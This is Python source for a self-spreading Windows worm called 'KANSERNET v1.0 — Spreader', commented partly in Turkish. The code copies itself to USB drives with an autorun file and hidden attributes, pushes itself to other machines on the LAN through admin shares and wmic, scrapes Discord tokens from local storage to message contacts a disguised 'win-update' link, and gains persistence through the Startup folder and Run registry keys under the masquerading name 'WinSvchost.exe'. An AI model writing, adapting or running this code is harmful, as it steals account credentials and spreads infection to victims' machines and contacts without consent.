#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
KANSERNET v1.0 — Spreader
USB Worm + LAN Spreader + Discord/Telegram spread
"""
import os, sys, shutil, subprocess, time, random, string, socket, threading

PAYLOAD_PATH = sys.executable
PAYLOAD_NAME = "WinSvchost.exe"

def usb_spread():
    """USB worm — otomatik kopyalama + autorun"""
    import string as str_mod
    while True:
        for drive in str_mod.ascii_uppercase:
            dp = f"{drive}:\\"
            if os.path.exists(dp) and drive not in "ABC":
                try:
                    dst = os.path.join(dp, PAYLOAD_NAME)
                    if not os.path.exists(dst):
                        shutil.copy2(PAYLOAD_PATH, dst)
                        with open(os.path.join(dp, "autorun.inf"), "w") as f:
                            f.write("[AutoRun]\nopen=" + PAYLOAD_NAME + "\naction=Open folder to view files\n")
                        os.system(f"attrib +h +s {dst}")
                except: pass
        time.sleep(5)

def lan_spread():
    """LAN worm — SMB/admin share yayilma"""
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        prefix = ".".join(ip.split(".")[:3])
        for i in range(1, 255):
            target = f"{prefix}.{i}"
            if target == ip: continue
            for share in ["C$", "ADMIN$"]:
                try:
                    dst = f"\\\\{target}\\{share}\\Windows\\Temp\\{PAYLOAD_NAME}"
                    shutil.copy2(PAYLOAD_PATH, dst)
                    subprocess.run(f'wmic /node:"{target}" process call create "C:\\Windows\\Temp\\{PAYLOAD_NAME}"', shell=True, capture_output=True, timeout=3)
                except: pass
    except: pass

def discord_spread():
    """Discord token avi + otomatik gonderim"""
    try:
        base = os.path.join(os.getenv("APPDATA", ""), "discord", "Local Storage", "leveldb")
        if not os.path.exists(base): return
        tokens = []
        for f in os.listdir(base):
            if f.endswith(".ldb") or f.endswith(".log"):
                try:
                    with open(os.path.join(base, f), "r", encoding="utf-8", errors="ignore") as ff:
                        import re
                        tokens += re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', ff.read())
                        tokens += re.findall(r'mfa\.[\w-]{84}', ff.read())
                except: pass
        tokens = list(set(tokens))
        for token in tokens[:3]:
            try:
                import urllib.request, json as j
                req = urllib.request.Request("https://discord.com/api/v9/users/@me/channels", headers={"Authorization": token})
                channels = j.loads(urllib.request.urlopen(req).read())
                for ch in channels[:5]:
                    try:
                        msg = f"Check this out: https://tinyurl.com/win-update"
                        urllib.request.Request(f"https://discord.com/api/v9/channels/{ch['id']}/messages", data=j.dumps({"content": msg}).encode(), headers={"Authorization": token, "Content-Type": "application/json"}, method="POST")
                    except: pass
            except: pass
    except: pass

def startup_spread():
    """Startup klasorune kopyala + registry"""
    try:
        dst = os.path.join(os.getenv("APPDATA", ""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", PAYLOAD_NAME)
        os.makedirs(os.path.dirname(dst), exist_ok=True)
        shutil.copy2(PAYLOAD_PATH, dst)
        subprocess.run(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinSvchost" /t REG_SZ /d "{dst}" /f', shell=True, capture_output=True)
        subprocess.run(f'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinSvchost" /t REG_SZ /d "{dst}" /f', shell=True, capture_output=True)
    except: pass

def run_all():
    threading.Thread(target=usb_spread, daemon=True).start()
    threading.Thread(target=lan_spread, daemon=True).start()
    threading.Thread(target=discord_spread, daemon=True).start()
    startup_spread()

if __name__ == "__main__":
    run_all()
